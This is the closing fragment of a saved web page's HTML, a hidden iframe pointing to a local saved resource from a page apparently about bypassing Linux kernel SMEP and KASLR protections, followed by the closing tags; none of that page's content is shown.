--><iframe style="display: none;" allow="autoplay &#39;self&#39;; fullscreen &#39;self&#39;" src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/saved_resource(1).html"></iframe></body></html>